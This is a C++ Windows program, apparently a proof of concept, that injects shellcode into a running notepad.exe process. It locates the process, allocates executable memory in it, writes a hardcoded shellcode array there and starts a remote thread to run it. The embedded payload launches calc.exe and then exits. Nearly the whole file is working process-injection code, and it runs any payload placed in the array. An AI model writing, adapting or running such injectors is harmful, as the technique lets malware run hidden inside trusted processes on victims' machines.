#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <iostream>
#include <wchar.h>

using namespace std;

unsigned char payload[] = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";

unsigned int payload_len = sizeof payload;

int findTarget(const char* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	const wchar_t* pname = L"notepad.exe";

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32FirstW(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32NextW(hProcSnap, &pe32)) {
		//printf("procname %s, %s\n", procname, pe32.szExeFile);
		wcout << "\n" << "comparing with: " << pe32.szExeFile << "\n";
		wcout << "\n" << "notepad string :" << procname << "\n";
		if (wcscmp(pname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	// I wanna die
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	SIZE_T* f = NULL;

	printf("Here reached at notepad");

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, f);



	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);

	cout << "\nhThread : " << hThread << " , " << hProc << " , "<< payload_len << " , " << pRemoteCode << " , " << f <<"\n";

	if (hThread != NULL) {

		cout << "createRemotethread called\n";
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	else {
		cout << "\nnot able to create remote thread";
	}

	return -1;
}



int main() {
	int pid = 0;
	HANDLE hProc = NULL;

	pid = findTarget("notepad.exe");

	printf("\nfindtarget done\n");
	printf("\nthe pid is %d\n", pid);

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
		else {
			cout << "\nNOtepad not open dude.\n";
		}
	}
}